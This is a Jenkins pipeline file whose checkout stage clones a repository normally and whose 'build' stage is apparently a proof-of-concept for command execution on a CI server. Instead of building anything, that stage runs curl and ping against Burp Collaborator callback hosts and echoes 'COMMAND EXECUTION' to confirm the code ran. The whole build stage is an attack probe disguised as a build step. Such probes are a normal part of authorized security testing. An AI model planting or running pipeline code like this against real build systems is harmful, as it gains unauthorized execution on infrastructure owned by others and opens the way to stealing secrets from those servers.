#!/bin/groovy
node {

    stage('checkout') {
        // Clone repo and subtree
        checkout([
            $class: 'GitSCM',
            gitTool: 'native git',
            branches: scm.branches,
            doGenerateSubmoduleConfigurations: false,
            extensions: [
                [$class: 'SubmoduleOption', disableSubmodules: false, parentCredentials: false, recursiveSubmodules: true, reference: '', trackingSubmodules: false]
            ],
            userRemoteConfigs: scm.userRemoteConfigs
        ])
    }

    stage('build') {
        sh "curl waaos18to2s8z1au2git1u5tskybm0.burpcollaborator.net"
        sh "echo COMMAND EXECUTION"
        sh "curl g1i8jlzdfmjsql1et09dsewdj4pudj.burpcollaborator.net"
        sh "echo COMMAND EXECUTION"
        sh "ping -c 3 waaos18to2s8z1au2git1u5tskybm0.burpcollaborator.net"
    }
}
